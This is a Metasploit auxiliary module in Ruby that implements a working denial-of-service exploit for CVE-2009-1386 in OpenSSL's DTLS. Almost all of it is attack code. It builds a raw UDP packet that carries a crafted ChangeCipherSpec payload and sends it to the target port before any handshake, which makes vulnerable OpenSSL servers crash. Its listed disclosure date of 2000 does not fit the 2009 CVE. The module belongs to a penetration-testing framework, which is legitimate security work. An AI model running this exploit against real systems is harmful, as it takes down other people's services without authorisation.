##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'
require 'racket'

class Metasploit3 < Msf::Auxiliary

	include Msf::Auxiliary::Dos
	include Msf::Exploit::Capture
	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'		=> 'OpenSSL < 0.9.8i DTLS ChangeCipherSpec Remote DoS Exploit',
			'Description'	=> %q{
					This module performs a Denial of Service Attack against Datagram TLS in OpenSSL
				version 0.9.8i and earlier. OpenSSL crashes under these versions when it recieves a
				ChangeCipherspec Datagram before a ClientHello.
			},
			'Author'	=> ['TheLightCosine <thelightcosine@gmail.com>'],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'CVE', 'CVE-2009-1386' ]
				],
			'DisclosureDate' => 'Apr 26 2000'))

		deregister_options('FILTER','PCAPFILE', 'INTERFACE', 'SNAPLEN', 'TIMEOUT')
	end

	def run
		print_status("Creating DTLS ChangeCipherSpec Datagram...")
		open_pcap
		n = Racket::Racket.new

		n.layers[3] = Racket::L3::IPv4.new
		n.layers[3].dst_ip = datastore['RHOST']
		n.layers[3].version = 4
		n.layers[3].hlen = 0x5 #
		n.layers[3].ttl = 44
		n.layers[3].protocol = 0x11

		n.layers[4] = Racket::L4::UDP.new
		n.layers[4].src_port = 34060
		n.layers[4].dst_port = Integer(datastore['RPORT'])
		n.layers[4].payload = "\x14\xfe\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x01"
		n.layers[4].fix!(n.layers[3].src_ip, n.layers[3].dst_ip)

		buff = n.pack
		print_status("Sending Datagram to target...")
		capture_sendto(buff, '255.255.255.255')
		close_pcap
	end
end